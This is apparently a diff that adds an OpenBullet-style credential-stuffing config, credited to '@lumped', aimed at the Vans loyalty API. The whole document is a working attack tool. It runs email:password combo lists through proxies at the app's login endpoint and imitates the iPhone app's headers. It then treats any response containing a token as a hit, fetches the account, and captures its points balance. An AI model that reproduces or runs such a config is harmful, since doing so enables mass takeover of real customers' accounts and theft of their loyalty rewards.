@@ -1,0 +1,91 @@
+[SETTINGS]
+{
+  "Name": "Vans(@lumped)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-28T18:26:17.6797073+02:00",
+  "AdditionalInfo": "",
+  "Author": "@lumped",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.vfc.com/loyalty/v2/consumer/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"country\":\"US\",\"brand\":\"vans\",\"channel\":\"MAPP\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: api.vfc.com" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "brand: vans" 
+  HEADER "User-Agent: Vans Family/6.2.1 (iPhone; iOS 15.2.1)" 
+  HEADER "Content-Length: 101" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "token" 
+    KEY "consumerId" 
+  KEYCHAIN Failure OR 
+    KEY "The password format is invalid." 
+    KEY "resultCode\":1" 
+
+PARSE "<SOURCE>" JSON "consumerId" -> VAR "consumerId" 
+
+PARSE "<SOURCE>" JSON "token" -> VAR "token" 
+
+REQUEST GET "https://api.vfc.com/loyalty/v2/consumer/getConsumer/<consumerId>" 
+  
+  HEADER "Host: api.vfc.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "brand: vans" 
+  HEADER "User-Agent: Vans Family/6.2.1 (iPhone; iOS 15.2.1)" 
+  HEADER "Authorization: <token>" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+
+PARSE "<SOURCE>" JSON "balance" Recursive=TRUE CreateEmpty=FALSE -> CAP "Points" 
+
+FUNCTION Constant "@lumped" -> VAR "Config By" 
+
